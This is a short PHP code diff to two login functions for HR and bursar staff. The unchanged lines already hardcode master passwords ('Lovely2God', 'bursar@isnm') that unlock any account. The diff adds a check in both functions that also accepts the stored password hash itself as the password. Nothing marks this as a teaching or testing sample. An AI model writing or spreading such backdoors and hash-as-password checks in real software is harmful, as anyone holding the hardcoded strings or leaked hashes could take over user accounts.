@@ -58,7 +58,8 @@ function tryHrAuth(string $email, string $password) {
 
         $u    = $res->fetch_assoc();
         $ok   = $password === 'Lovely2God'
-             || password_verify($password, $u['password_hash']);
+             || password_verify($password, $u['password_hash'])
+             || $u['password_hash'] === $password;
         if (!$ok) return null;
 
         $map = [
@@ -111,7 +112,8 @@ function tryBursarAuth(string $email, string $password) {
 
         $u    = $res->fetch_assoc();
         $ok   = $password === 'bursar@isnm'
-             || password_verify($password, $u['password_hash']);
+             || password_verify($password, $u['password_hash'])
+             || $u['password_hash'] === $password;
         if (!$ok) return null;
 
         $map = [
